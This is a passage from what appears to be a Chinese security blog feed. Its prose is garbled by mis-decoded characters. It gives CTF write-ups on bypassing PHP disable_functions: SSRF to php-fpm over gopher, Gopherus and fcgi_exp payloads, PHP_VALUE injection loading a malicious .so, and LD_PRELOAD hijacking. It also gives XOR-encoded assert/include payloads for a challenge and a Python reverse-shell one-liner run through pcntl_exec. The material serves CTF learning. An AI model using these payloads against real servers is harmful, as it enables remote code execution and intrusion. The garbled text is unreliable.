ä¸ºåœ¨é…ç½®ç«¯å£ç›‘å¬çš„æ—¶å€™ï¼Œä»…å…è®¸ç›‘å¬åœ¨127.0.0.1ï¼Œä¸å­˜åœ¨ php-fpm æœªæˆæƒè®¿é—®ã€‚æˆ‘ä»¬è¦é€šè¿‡ SSRF æ¥ä»ç›®æ ‡æœºå†…éƒ¨æ”»å‡» 9000 ç«¯å£ï¼š</p><p>ä½¿ç”¨ <code>nc -lvvp 1234 &gt; fcg_exp.txt</code> ç›‘å¬1234 ç«¯å£æ¥æ”¶ payloadï¼š</p><p><img src="/2021/08/14/ff2/5.png" alt="5"></p><p>å¦å¤–å¼€å¯ä¸€ä¸ªç»ˆç«¯å‘é€ payloadï¼š</p><pre><code class="hljs routeros">./fcgi_exp<span class="hljs-built_in"> system </span>127.0.0.1 1234 /var/www/html/index.php <span class="hljs-string">&quot;id&quot;</span></code></pre><p><img src="/2021/08/14/ff2/6.png" alt="6"></p><p>è¿™é‡Œæ”»å‡»çš„ç«¯å£æ˜¯å‰é¢ç›‘å¬çš„ç«¯å£ï¼Œç›®çš„æ˜¯å°†payloadå‘é€åˆ°è¿™ä¸ªç«¯å£ï¼›å¾—åˆ°äº†ä¸€ä¸ªfcg_exp.txtçš„æ–‡ä»¶ï¼š</p><p><img src="/2021/08/14/ff2/7.png" alt="7"></p><p>æœ‰éƒ¨åˆ†ä¸å¯è§å­—ç¬¦ï¼Œurlç¼–ç ï¼š</p><pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> urllib.parse import <span class="hljs-literal">quote</span>, unquote, urlencode<span class="hljs-built_in">file</span> = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;fcg_exp.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)payload = <span class="hljs-built_in">file</span>.<span class="hljs-built_in">read</span>()print(<span class="hljs-string">&quot;gopher://127.0.0.1:9000/_&quot;</span>+<span class="hljs-literal">quote</span>(payload).<span class="hljs-built_in">replace</span>(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D&quot;</span>).<span class="hljs-built_in">replace</span>(<span class="hljs-string">&quot;%2F&quot;</span>,<span class="hljs-string">&quot;/&quot;</span>))</code></pre><p>æ‰§è¡Œåå°†payloadè¿›è¡ŒäºŒæ¬¡urlç¼–ç ï¼ˆGETè¿›è¡Œä¸€æ¬¡è§£ç ï¼Œcurlä¹Ÿä¼šå†è¿›è¡Œä¸€æ¬¡è§£ç ï¼‰urlä¼ å‚å³å¯RCEã€‚</p><h4 id="åˆ©ç”¨-Gopherus-æ”»å‡»"><a class="header-anchor" href="#åˆ©ç”¨-Gopherus-æ”»å‡»">ğŸ­</a>åˆ©ç”¨ Gopherus æ”»å‡»</h4><p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></p><p><img src="/2021/08/14/ff2/4.png" alt="4"></p><p>å·¥å…·éœ€è¦çš„å‚æ•°ï¼š</p><pre><code class="hljs awk">python gopherus.py --exploit fastcgi<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/i</span>ndex.php                 <span class="hljs-comment"># è¿™é‡Œè¾“å…¥çš„æ˜¯ä¸€ä¸ªå·²çŸ¥å­˜åœ¨çš„phpæ–‡ä»¶</span>id                                      <span class="hljs-comment">#è¦è·å–çš„ä¿¡æ¯</span></code></pre><p><img src="/2021/08/14/ff2/8.png" alt="8"></p><h3 id="åŠ è½½æ¶æ„-soç»•è¿‡-Disable-Dunctionså®ç°-RCE"><a class="header-anchor" href="#åŠ è½½æ¶æ„-soç»•è¿‡-Disable-Dunctionså®ç°-RCE">ğŸ­</a>åŠ è½½æ¶æ„ .soç»•è¿‡ Disable_Dunctionså®ç° RCE</h3><p>LD_PRELOAD ç»•è¿‡ disable_functions æ˜¯æŠŠæˆ‘ä»¬ç¼–è¯‘å‡ºæ¥çš„æ¶æ„çš„ .so æ–‡ä»¶åŠ è½½åˆ°ç¯å¢ƒå˜é‡ä¸­å»æ‰§è¡Œï¼Œå®ç°RCEçš„ï¼ŒLD_PRELOAD æ˜¯é€šè¿‡ putenv() æŠŠsoæ–‡ä»¶åŠ è½½åˆ°ç¯å¢ƒå˜é‡ä¸­å†å»è°ƒç”¨ã€‚é‚£ä¹ˆ Fastcgi ä¹Ÿå¯ä»¥åšåŒæ ·çš„äº‹ï¼Œåªéœ€è¦é€šè¿‡ <code>PHP_VALUE</code> ç»™ php.ini æ·»åŠ ä¸€ä¸ª extender æ‰©å±•å³å¯</p><pre><code class="hljs lsl">$php_value = <span class="hljs-string">&quot;unserialize_callback_func = system<span class="hljs-subst">\n</span>extension_dir = /tmp<span class="hljs-subst">\n</span>extension = hpdoger.so<span class="hljs-subst">\n</span>disable_classes = <span class="hljs-subst">\n</span>disable_functions = <span class="hljs-subst">\n</span>allow_url_include = On<span class="hljs-subst">\n</span>open_basedir = /<span class="hljs-subst">\n</span>auto_prepend_file = &quot;</span>;</code></pre><p>å‚è€ƒï¼š<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p><p><a href="https://whoamianony.top/2021/05/15/Web%E5%AE%89%E5%85%A8/%E6%B5%85%E5%85%A5%E6%B7%B1%E5%87%BA%20Fastcgi%20%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E4%B8%8E%20PHP-FPM%20%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/">https://whoamianony.top/2021/05/15/Webå®‰å…¨/æµ…å…¥æ·±å‡º Fastcgi åè®®åˆ†æä¸ PHP-FPM æ”»å‡»æ–¹æ³•/</a></p>]]></content>
    
    
    <categories>
      
      <category>bypass</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Bypass Disable Functionï¼ˆä¸€ï¼‰</title>
    <link href="/2021/08/13/ff/"/>
    <url>/2021/08/13/ff/</url>
    
    <content type="html"><![CDATA[<h3 id="Disable-Functions"><a class="header-anchor" href="#Disable-Functions">ğŸ­</a>Disable Functions</h3><p>å¹³å¸¸çš„CTFä¸­ç»å¸¸æ‹¿åˆ°webshellæ— æ³•æ‰§è¡Œå‘½ä»¤ï¼ŒåŸå› ï¼š</p><ul><li>php.ini ä¸­ç”¨ disable_functions æŒ‡ç¤ºå™¨ç¦ç”¨äº† system()ã€exec() ç­‰ç­‰è¿™ç±»å‘½ä»¤æ‰§è¡Œçš„ç›¸å…³å‡½æ•°ï¼›</li><li>web è¿›ç¨‹è¿è¡Œåœ¨ rbash è¿™ç±»å—é™ shell ç¯å¢ƒä¸­ï¼›</li><li>WAF æ‹¦åŠ«ã€‚</li></ul><p>è¿™æ—¶å€™å°±éœ€è¦æƒ³åŠæ³•ç»•è¿‡disable_functionsã€‚</p><p>å¸¸è§å±é™©å‡½æ•°ï¼š</p><ul><li>phpinfo() ï¼šè¾“å‡º PHP ç¯å¢ƒä¿¡æ¯ä»¥åŠç›¸å…³çš„æ¨¡å—ã€WEB ç¯å¢ƒç­‰ä¿¡æ¯ã€‚</li><li>passthru() ï¼šå…è®¸æ‰§è¡Œä¸€ä¸ªå¤–éƒ¨ç¨‹åºå¹¶å›æ˜¾è¾“å‡ºï¼Œç±»ä¼¼äº exec()ã€‚</li><li>exec() ï¼šå…è®¸æ‰§è¡Œä¸€ä¸ªå¤–éƒ¨ç¨‹åºï¼ˆå¦‚ UNIX Shell æˆ– CMD å‘½ä»¤ç­‰ï¼‰ã€‚</li><li>system() ï¼šå…è®¸æ‰§è¡Œä¸€ä¸ªå¤–éƒ¨ç¨‹åºå¹¶å›æ˜¾è¾“å‡ºï¼Œç±»ä¼¼äº passthru()ã€‚</li><li>chroot() ï¼šå¯æ”¹å˜å½“å‰ PHP è¿›ç¨‹çš„å·¥ä½œæ ¹ç›®å½•ï¼Œä»…å½“ç³»ç»Ÿæ”¯æŒ CLI æ¨¡å¼ PHP æ—¶æ‰èƒ½å·¥ä½œï¼ˆä¸é€‚ç”¨äº Windows ç³»ç»Ÿï¼‰ã€‚</li><li>scandir() ï¼šåˆ—å‡ºæŒ‡å®šè·¯å¾„ä¸­çš„æ–‡ä»¶å’Œç›®å½•ã€‚</li><li>chgrp() ï¼šæ”¹å˜æ–‡ä»¶æˆ–ç›®å½•æ‰€å±çš„ç”¨æˆ·ç»„ã€‚</li><li>chown() ï¼šæ”¹å˜æ–‡ä»¶æˆ–ç›®å½•çš„æ‰€æœ‰è€…ã€‚</li><li>shell_exec() ï¼šé€šè¿‡ Shell æ‰§è¡Œå‘½ä»¤ï¼Œå¹¶å°†æ‰§è¡Œç»“æœä½œä¸ºå­—ç¬¦ä¸²è¿”å›ã€‚</li><li>proc_open() ï¼šæ‰§è¡Œä¸€ä¸ªå‘½ä»¤å¹¶æ‰“å¼€æ–‡ä»¶æŒ‡é’ˆç”¨äºè¯»å–ä»¥åŠå†™å…¥ã€‚</li><li>proc_get_status() ï¼šè·å–ä½¿ç”¨ proc_open() æ‰€æ‰“å¼€è¿›ç¨‹çš„ä¿¡æ¯ã€‚</li><li>error_log() ï¼šå°†é”™è¯¯ä¿¡æ¯å‘é€åˆ°æŒ‡å®šä½ç½®ï¼ˆæ–‡ä»¶ï¼‰ã€‚ å®‰å…¨å¤‡æ³¨ï¼šåœ¨æŸäº›ç‰ˆæœ¬çš„ PHP ä¸­ï¼Œå¯ä½¿ç”¨ error_log() ç»•è¿‡ PHP safe modeï¼Œ æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</li><li>ini_alter() ï¼šæ˜¯ ini_set() å‡½æ•°çš„ä¸€ä¸ªåˆ«åå‡½æ•°ï¼ŒåŠŸèƒ½ä¸ ini_set() ç›¸åŒã€‚ å…·ä½“å‚è§ ini_set()ã€‚</li><li>ini_set() ï¼šå¯ç”¨äºä¿®æ”¹ã€è®¾ç½® PHP ç¯å¢ƒé…ç½®å‚æ•°ã€‚</li><li>ini_restore() ï¼šå¯ç”¨äºæ¢å¤ PHP ç¯å¢ƒé…ç½®å‚æ•°åˆ°å…¶åˆå§‹å€¼ã€‚</li><li>dl() ï¼šåœ¨ PHP è¿›è¡Œè¿è¡Œè¿‡ç¨‹å½“ä¸­ï¼ˆè€Œéå¯åŠ¨æ—¶ï¼‰åŠ è½½ä¸€ä¸ª PHP å¤–éƒ¨æ¨¡å—ã€‚</li><li>pfsockopen() ï¼šå»ºç«‹ä¸€ä¸ª Internet æˆ– UNIX åŸŸçš„ socket æŒä¹…è¿æ¥ã€‚</li><li>syslog() ï¼šå¯è°ƒç”¨ UNIX ç³»ç»Ÿçš„ç³»ç»Ÿå±‚ syslog() å‡½æ•°ã€‚</li><li>readlink() ï¼šè¿”å›ç¬¦å·è¿æ¥æŒ‡å‘çš„ç›®æ ‡æ–‡ä»¶å†…å®¹ã€‚</li><li>symlink() ï¼šåœ¨ UNIX ç³»ç»Ÿä¸­å»ºç«‹ä¸€ä¸ªç¬¦å·é“¾æ¥ã€‚</li><li>popen() ï¼šå¯é€šè¿‡ popen() çš„å‚æ•°ä¼ é€’ä¸€æ¡å‘½ä»¤ï¼Œå¹¶å¯¹ popen() æ‰€æ‰“å¼€çš„æ–‡ä»¶è¿›è¡Œæ‰§è¡Œã€‚</li><li>stream_socket_server() ï¼šå»ºç«‹ä¸€ä¸ª Internet æˆ– UNIX æœåŠ¡å™¨è¿æ¥ã€‚</li><li>putenv() ï¼šç”¨äºåœ¨ PHP è¿è¡Œæ—¶æ”¹å˜ç³»ç»Ÿå­—ç¬¦é›†ç¯å¢ƒã€‚åœ¨ä½äº 5.2.6 ç‰ˆæœ¬çš„ PHP ä¸­ï¼Œå¯åˆ©ç”¨è¯¥å‡½æ•° ä¿®æ”¹ç³»ç»Ÿå­—ç¬¦é›†ç¯å¢ƒåï¼Œåˆ©ç”¨ sendmail æŒ‡ä»¤å‘é€ç‰¹æ®Šå‚æ•°æ‰§è¡Œç³»ç»Ÿ SHELL å‘½ä»¤ã€‚</li></ul><h3 id="ç»•è¿‡æ–¹å¼"><a class="header-anchor" href="#ç»•è¿‡æ–¹å¼">ğŸ­</a>ç»•è¿‡æ–¹å¼</h3><ul><li>ç¬¬ä¸€ç§ï¼Œæ”»å‡»åç«¯ç»„ä»¶ï¼Œå¯»æ‰¾å­˜åœ¨å‘½ä»¤æ³¨å…¥çš„ã€web åº”ç”¨å¸¸ç”¨çš„åç«¯ç»„ä»¶ï¼Œå¦‚ï¼ŒImageMagick çš„é­”å›¾æ¼æ´ã€bash  çš„ç ´å£³æ¼æ´ï¼›</li><li>ç¬¬äºŒç§ï¼Œå¯»æ‰¾æœªç¦ç”¨çš„æ¼ç½‘å‡½æ•°ï¼Œå¸¸è§çš„æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°æœ‰  system()ã€exec()ã€shell_exec()ã€passthru()ï¼Œååƒ»çš„     popen()ã€proc_open()ã€pcntl_exec()ï¼Œé€ä¸€å°è¯•ï¼›</li><li>ç¬¬ä¸‰ç§ï¼Œmod_cgi æ¨¡å¼ï¼Œå°è¯•ä¿®æ”¹  .htaccessï¼Œè°ƒæ•´è¯·æ±‚è®¿é—®è·¯ç”±ï¼Œç»•è¿‡ php.ini ä¸­çš„ä»»ä½•é™åˆ¶ï¼›</li><li>ç¬¬å››ç§ï¼Œåˆ©ç”¨ç¯å¢ƒå˜é‡ LD_PRELOAD  åŠ«æŒç³»ç»Ÿå‡½æ•°ï¼Œè®©å¤–éƒ¨ç¨‹åºåŠ è½½æ¶æ„ *.soï¼Œè¾¾åˆ°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ•ˆæœ</li></ul><h3 id="åˆ©ç”¨-LD-PRELOAD-ç¯å¢ƒå˜é‡"><a class="header-anchor" href="#åˆ©ç”¨-LD-PRELOAD-ç¯å¢ƒå˜é‡">ğŸ­</a>åˆ©ç”¨ LD_PRELOAD ç¯å¢ƒå˜é‡</h3><h4 id="åŸç†"><a class="header-anchor" href="#åŸç†">ğŸ­</a>åŸç†</h4><p>LD_PRELOADæ˜¯Linuxç³»ç»Ÿçš„ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œå®ƒå¯ä»¥å½±å“ç¨‹åºçš„è¿è¡Œæ—¶çš„é“¾æ¥ï¼ˆRuntime linkerï¼‰ï¼Œå…è®¸å®šä¹‰åœ¨ç¨‹åºè¿è¡Œå‰ä¼˜å…ˆåŠ è½½çš„åŠ¨æ€é“¾æ¥åº“ã€‚ä¸»è¦ç”¨æ¥æœ‰é€‰æ‹©æ€§çš„è½½å…¥ä¸åŒåŠ¨æ€é“¾æ¥åº“ä¸­çš„ç›¸åŒå‡½æ•°ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡å®ƒåœ¨ä¸»ç¨‹åºå’Œå…¶åŠ¨æ€é“¾æ¥åº“çš„ä¸­é—´åŠ è½½åˆ«çš„åŠ¨æ€é“¾æ¥åº“ï¼Œç”šè‡³è¦†ç›–æ­£å¸¸çš„å‡½æ•°åº“ã€‚ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬å¯ä»¥ä»¥æ­¤åŠŸèƒ½æ¥ä½¿ç”¨è‡ªå·±çš„æˆ–æ˜¯æ›´å¥½çš„å‡½æ•°ï¼ˆæ— éœ€åˆ«äººçš„æºç ï¼‰ï¼Œè€Œå¦ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä»¥å‘åˆ«äººçš„ç¨‹åºæ³¨å…¥ç¨‹åºï¼Œä»è€Œè¾¾åˆ°ç‰¹å®šçš„æ”»å‡»ç›®çš„ã€‚é€šè¿‡ç¯å¢ƒå˜é‡ LD_PRELOAD åŠ«æŒç³»ç»Ÿå‡½æ•°ï¼Œå¯ä»¥è¾¾åˆ°ä¸è°ƒç”¨ PHP çš„å„ç§å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼ˆsystem()ã€exec() ç­‰ç­‰ï¼‰ä»å¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„ç›®çš„ã€‚</p><h4 id="æ¡ä»¶"><a class="header-anchor" href="#æ¡ä»¶">ğŸ­</a>æ¡ä»¶</h4><ul><li>èƒ½ä¸Šä¼ è‡ªå·±çš„.soæ–‡ä»¶</li><li>èƒ½å¤Ÿæ§åˆ¶LD_PRELOADç¯å¢ƒå˜é‡çš„å€¼ï¼Œæ¯”å¦‚putenv()å‡½æ•° å› ä¸ºæ–°è¿›ç¨‹å¯åŠ¨å°†åŠ è½½LD_PRELOADä¸­çš„.soæ–‡ä»¶ï¼Œæ‰€ä»¥è¦å­˜åœ¨å¯ä»¥æ§åˆ¶PHPå¯åŠ¨å¤–éƒ¨ç¨‹åºçš„å‡½æ•°å¹¶èƒ½æ‰§è¡Œï¼Œæ¯”å¦‚mail()ã€imap_mail()ã€mb_send_mail()å’Œerror_log()å‡½æ•°ç­‰</li></ul><h4 id="æ€è·¯"><a class="header-anchor" href="#æ€è·¯">ğŸ­</a>æ€è·¯</h4><p>åˆ©ç”¨æ¼æ´æ§åˆ¶ web å¯åŠ¨æ–°è¿›ç¨‹ a.binï¼Œa.bin å†…éƒ¨è°ƒç”¨ç³»ç»Ÿå‡½æ•° b()ï¼Œb()  ä½äºç³»ç»Ÿå…±äº«å¯¹è±¡ <a href="http://c.so">c.so</a>  ä¸­ï¼Œæ‰€ä»¥ç³»ç»Ÿä¸ºè¯¥è¿›ç¨‹åŠ è½½å…± <a href="http://c.so">c.so</a>ï¼Œæƒ³æ³•åœ¨ <a href="http://c.so">c.so</a> å‰ä¼˜å…ˆåŠ è½½å¯æ§çš„ c_evil.soï¼Œc_evil.so  å†…å«ä¸ b()  åŒåçš„æ¶æ„å‡½æ•°ï¼Œç”±äº c_evil.so ä¼˜å…ˆçº§è¾ƒé«˜ï¼Œæ‰€ä»¥ï¼Œa.bin å°†è°ƒç”¨åˆ° c_evil.so å†… b() è€Œéç³»ç»Ÿçš„  <a href="http://c.so">c.so</a> å†…  b()ï¼ŒåŒæ—¶ï¼Œc_evil.so å¯æ§ï¼Œè¾¾åˆ°æ‰§è¡Œæ¶æ„ä»£ç çš„ç›®çš„ã€‚</p><h4 id="æµç¨‹"><a class="header-anchor" href="#æµç¨‹">ğŸ­</a>æµç¨‹</h4><ul><li>ç¼–å†™ä¸€ä¸ªåŸå‹ä¸º uid_t getuid(void); çš„ C å‡½æ•°ï¼Œå†…éƒ¨æ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„ä»£ç ï¼Œå¹¶ç¼–è¯‘æˆå…±äº«å¯¹è±¡ getuid_shadow.soï¼›</li><li>è¿è¡Œ PHP å‡½æ•° putenv()ï¼Œè®¾å®šç¯å¢ƒå˜é‡ LD_PRELOAD ä¸º  getuid_shadow.soï¼Œä»¥ä¾¿åç»­å¯åŠ¨æ–°è¿›ç¨‹æ—¶ä¼˜å…ˆåŠ è½½è¯¥å…±äº«å¯¹è±¡ï¼›</li><li>è¿è¡Œ PHP çš„ mail() å‡½æ•°ï¼Œmail() å†…éƒ¨å¯åŠ¨æ–°è¿›ç¨‹ /usr/sbin/sendmailï¼Œç”±äºä¸Šä¸€æ­¥   LD_PRELOAD çš„ä½œç”¨ï¼Œsendmail è°ƒç”¨çš„ç³»ç»Ÿå‡½æ•° getuid() è¢«ä¼˜å…ˆçº§æ›´å¥½çš„ getuid_shadow.so ä¸­çš„åŒå   getuid() æ‰€åŠ«æŒï¼›</li><li>è¾¾åˆ°ä¸è°ƒç”¨ PHP çš„å„ç§å‘½ä»¤æ‰§è¡Œå‡½æ•°è¾¾åˆ°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„ç›®çš„ã€‚</li></ul><h4 id="é˜»ç¢"><a class="header-anchor" href="#é˜»ç¢">ğŸ­</a>é˜»ç¢</h4><ul><li>æŸäº›ç¯å¢ƒä¸­ï¼Œweb ç¦æ­¢å¯ç”¨ sendmailã€ç”šè‡³ç³»ç»Ÿä¸Šæ ¹æœ¬æœªå®‰è£… sendmailï¼Œé€šå¸¸çš„ www-data æƒé™ä¸èƒ½æ›´æ”¹ php.ini é…ç½®ã€å®‰è£… sendmail è½¯ä»¶ï¼›</li><li>å³ä¾¿ç›®æ ‡å¯ä»¥å¯ç”¨ sendmailï¼Œç”±äºæœªå°†ä¸»æœºåï¼ˆhostname è¾“å‡ºï¼‰æ·»åŠ è¿› hosts ä¸­ï¼Œå¯¼è‡´æ¯æ¬¡è¿è¡Œ sendmail éƒ½è¦è€—æ—¶åŠåˆ†é’Ÿç­‰å¾…åŸŸåè§£æè¶…æ—¶è¿”å›ï¼Œwww-data æ— æ³•å°†ä¸»æœºååŠ å…¥ hosts</li></ul><h4 id="åˆ©ç”¨ï¼š-æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME"><a class="header-anchor" href="#åˆ©ç”¨ï¼š-æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME">ğŸ­</a>åˆ©ç”¨ï¼š[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME</h4><p>æ— å­—æ¯shellåå‘ç°ç¦äº†ä¸€å †å‡½æ•°</p><p><img src="/2021/08/13/ff/2.png" alt="2"></p><p>æ„é€ shellè¿ä¸Šèšå‰‘åæ— æ³•æ‰§è¡Œå‘½ä»¤ï¼š</p><p><img src="/2021/08/13/ff/3.png" alt="3"></p><p>éœ€è¦åˆ©ç”¨å¦‚ä¸‹å‡ ä¸ªæ–‡ä»¶ï¼š</p><p><img src="/2021/08/13/ff/4.png" alt="4"></p><ul><li><p>bypass_disablefunc.phpï¼šä¸€ä¸ªç”¨æ¥æ‰§è¡Œå‘½ä»¤çš„ webshellã€‚</p><p>ä¸Šä¼ åˆ°webç›®å½•çš„ç›´æ¥è®¿é—®ï¼Œæ— æƒé™çš„è¯å¯ä»¥ä¼ åˆ°tmpç›®å½•åç”¨includeç­‰å‡½æ•°æ¥åŒ…å«ï¼Œå¹¶ä¸”éœ€è¦ç”¨ GET æ–¹æ³•æä¾›ä¸‰ä¸ªå‚æ•°ï¼š</p><ul><li>cmd å‚æ•°ï¼šå¾…æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤ï¼Œå¦‚ id å‘½ä»¤ã€‚</li><li>outpath å‚æ•°ï¼šä¿å­˜å‘½ä»¤æ‰§è¡Œè¾“å‡ºç»“æœçš„æ–‡ä»¶è·¯å¾„ï¼ˆå¦‚ /tmp/xxï¼‰ï¼Œä¾¿äºåœ¨é¡µé¢ä¸Šæ˜¾ç¤ºï¼Œå¦å¤–è¯¥å‚æ•°ï¼Œä½ åº”æ³¨æ„ web æ˜¯å¦æœ‰è¯»å†™æƒé™ã€web æ˜¯å¦å¯è·¨ç›®å½•è®¿é—®ã€æ–‡ä»¶å°†è¢«è¦†ç›–å’Œåˆ é™¤ç­‰å‡ ç‚¹ã€‚</li><li>sopath å‚æ•°ï¼šæŒ‡å®šåŠ«æŒç³»ç»Ÿå‡½æ•°çš„å…±äº«å¯¹è±¡çš„ç»å¯¹è·¯å¾„ï¼ˆå¦‚ /var/www/bypass_disablefunc_x64.soï¼‰ï¼Œå¦å¤–å…³äºè¯¥å‚æ•°ï¼Œä½ åº”æ³¨æ„ web æ˜¯å¦å¯è·¨ç›®å½•è®¿é—®åˆ°å®ƒã€‚</li></ul></li><li><p>bypass_disablefunc_x64.soæˆ–bypass_disablefunc_x86.soï¼šæ‰§è¡Œå‘½ä»¤çš„å…±äº«å¯¹è±¡æ–‡ä»¶ï¼Œåˆ†ä¸º64ä½çš„å’Œ32ä½çš„ã€‚</p></li><li><p>bypass_disablefunc.cï¼šç”¨æ¥ç¼–è¯‘ç”Ÿæˆä¸Šé¢çš„å…±äº«å¯¹è±¡æ–‡ä»¶ã€‚</p></li></ul><p>å°† bypass_disablefunc.php å’Œ bypass_disablefunc_x64.so ä¼ åˆ°ç›®æ ‡æœ‰æƒé™çš„ç›®å½•ä¸­</p><p><img src="/2021/08/13/ff/5.png" alt="5"></p><p>ç„¶åå°†bypass_disablefunc.phpåŒ…å«è¿›æ¥å¹¶ä½¿ç”¨GETæ–¹æ³•æä¾›æ‰€éœ€çš„å‚æ•°ï¼š</p><pre><code class="hljs markdown">?code=$&#123;<span class="hljs-emphasis">_GET&#125;[<span class="hljs-string">_</span>](<span class="hljs-link">$&#123;_GET&#125;[_]</span>);&amp;_</span>=assert&amp;<span class="hljs-strong">__=include(%27/var/tmp/bypass<span class="hljs-emphasis">_disablefunc.php%27)&amp;cmd=/readflag&amp;outpath=/tmp/tmpfile&amp;sopath=/var/tmp/bypass_</span>disablefunc<span class="hljs-emphasis">_x64.so</span></span></code></pre><p>å¼‚æˆ–æ„é€ </p><pre><code class="hljs sas">?code=$&#123;<span class="hljs-name">%fe</span><span class="hljs-name">%fe</span><span class="hljs-name">%fe</span><span class="hljs-name">%fe</span>^<span class="hljs-name">%a1</span><span class="hljs-name">%b9</span><span class="hljs-name">%bb</span><span class="hljs-name">%aa</span>&#125;[_]($&#123;<span class="hljs-name">%fe</span><span class="hljs-name">%fe</span><span class="hljs-name">%fe</span><span class="hljs-name">%fe</span>^<span class="hljs-name">%a1</span><span class="hljs-name">%b9</span><span class="hljs-name">%bb</span><span class="hljs-name">%aa</span>&#125;[__]);<span class="hljs-variable">&amp;_</span>=assert<span class="hljs-variable">&amp;__</span>=include(%27/var/tmp/bypass_disablefunc.php%27)<span class="hljs-variable">&amp;cmd</span>=/readflag<span class="hljs-variable">&amp;outpath</span>=/tmp/tmpfile<span class="hljs-variable">&amp;sopath</span>=/var/tmp/bypass_disablefunc_x64.so</code></pre><p>æ‰§è¡Œ</p><p><img src="/2021/08/13/ff/6.png" alt="6"></p><p>ä¹Ÿå¯ä»¥ç›´æ¥ç”¨èšå‰‘çš„æ’ä»¶disabled_functions,é€‰æ‹©æ¨¡å¼åä¼šåœ¨<code>/var/www/html</code>ç›®å½•é‡Œä¸Šä¼ ä¸€ä¸ª<code>.antproxy.php</code>æ–‡ä»¶ã€‚æˆ‘ä»¬åˆ›å»ºå‰¯æœ¬, å¹¶å°†è¿æ¥çš„ URL shell è„šæœ¬åå­—æ”¹ä¸º<code>.antproxy.php</code>è·å¾—ä¸€ä¸ªæ–°çš„shellï¼Œåœ¨è¿™ä¸ªæ–°shellé‡Œé¢å°±å¯ä»¥æˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚</p><h4 id="åˆ©ç”¨-pcntl-exec"><a class="header-anchor" href="#åˆ©ç”¨-pcntl-exec">ğŸ­</a>åˆ©ç”¨ pcntl_exec</h4><p>æ¡ä»¶ï¼šPHPå®‰è£…å¹¶å¯ç”¨äº†pcntlæ’ä»¶</p><p>pcntlæ˜¯linuxä¸‹çš„ä¸€ä¸ªæ‰©å±•ï¼Œå¯ä»¥æ”¯æŒphpçš„å¤šçº¿ç¨‹æ“ä½œã€‚å¾ˆå¤šæ—¶å€™ä¼šç¢°åˆ°ç¦ç”¨execå‡½æ•°çš„æƒ…å†µï¼Œä½†ç»å¸¸å¿½ç•¥pcntlæ‰©å±•çš„ç›¸å…³å‡½æ•°ã€‚pcntl_exec()æ˜¯pcntlæ’ä»¶ä¸“æœ‰çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤å‡½æ•°ï¼Œå¯ä»¥åœ¨å½“å‰è¿›ç¨‹ç©ºé—´æ‰§è¡ŒæŒ‡å®šçš„ç¨‹åºã€‚</p><p>åˆ©ç”¨pcntl_exec()<a href="http://xn--test-pk6hg45q.sh">æ‰§è¡Œtest.sh</a>ï¼š</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>(function_exists(<span class="hljs-string">&#x27;pcntl_exec&#x27;</span>)) &#123;   pcntl_exec(<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;/tmp/test.sh&quot;</span>));&#125; <span class="hljs-keyword">else</span> &#123;       <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;pcntl extension is not support!&#x27;</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>pcntl_exec()æ‰§è¡Œå‘½ä»¤æ²¡æœ‰å›æ˜¾ï¼Œå¸¸ä¸pythonç»“åˆæ¥åå¼¹shellï¼š</p><pre><code class="hljs javascript">&lt;?php pcntl_exec(<span class="hljs-string">&quot;/usr/bin/python&quot;</span>,array(<span class="hljs-string">&#x27;-c&#x27;</span>,<span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((&quot;xxx&quot;,9898));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span>));</code></pre><p>[ç¬¬å››å±Šâ€œè“å¸½æ¯â€å†³èµ›]phpè¿™é“é¢˜åˆ©ç”¨çš„å°±æ˜¯è¿™ä¸ªç‚¹ã€‚</p><h5 id="åˆ©ç”¨-ShellShockï¼ˆCVE-2014-6271ï¼‰"><a class="header-anchor" href="#åˆ©ç”¨-ShellShockï¼ˆCVE-2014-6271ï¼‰">ğŸ­</a>åˆ©ç”¨ ShellShockï¼ˆCVE-2014-6271ï¼‰</h5><p>è¿™ä¸ªæ´æ¯”è¾ƒè€ï¼Œè€Œä¸”ç°åœ¨æ²¡æ€ä¹ˆè§è¿‡ï¼Œèšå‰‘ç»ˆç«¯é›†æˆäº†å¯¹ ShellShock çš„åˆ©ç”¨ï¼Œå¯ä»¥ç›´æ¥æ‰§è¡Œå‘½ä»¤ã€‚</p><h5 